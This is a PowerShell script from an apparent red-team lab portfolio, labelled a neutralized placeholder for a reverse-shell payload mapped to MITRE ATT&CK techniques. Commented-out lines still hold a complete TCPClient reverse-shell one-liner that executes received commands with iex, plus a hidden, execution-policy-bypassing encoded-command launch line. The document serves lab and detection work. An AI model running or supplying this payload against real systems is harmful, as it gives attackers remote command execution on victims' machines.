# -------------------------------------------------------------------------
# ATTACK ARTIFACT: Initial Reverse Shell Payload
# PHASE: Initial Access / Execution (T1566.001, T1059.001)
# -------------------------------------------------------------------------

# This script is a neutralized placeholder for the reverse shell payload
# used in the ProjectX E101 lab. The actual C2 address and port have been changed
# to non-routable values for safety and public sharing.

# 1. Configuration Variables (NEUTRALIZED)
$C2_IP = "0.0.0.0"     # Placeholder for Attacker VM IP (e.g., 192.168.1.50)
$C2_Port = 443         # Placeholder for Attacker Listener Port

# 2. Payload Construction (Netcat Mimic via .NET)
# The actual payload uses the System.Net.Sockets.TCPClient class to connect
# back to the Attacker VM and redirect the victim's command shell (cmd.exe)
# over the network stream. The full command is commented out below:

# $Command = 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(' + \"'$C2_IP'\" + ',' + $C2_Port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

# 3. Execution Example (Disabled for Portfolio)
# In the lab, this script was likely executed using a hidden and obfuscated command,
# which the Blue Team's Sysmon and Wazuh rules were designed to detect:

# powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -EncodedCommand [BASE64_ENCODED_PAYLOAD]

Write-Host "NOTE: This script is a neutralized placeholder and will not execute a shell."
Write-Host "Review the commented-out lines to see the structure of the Red Team payload."
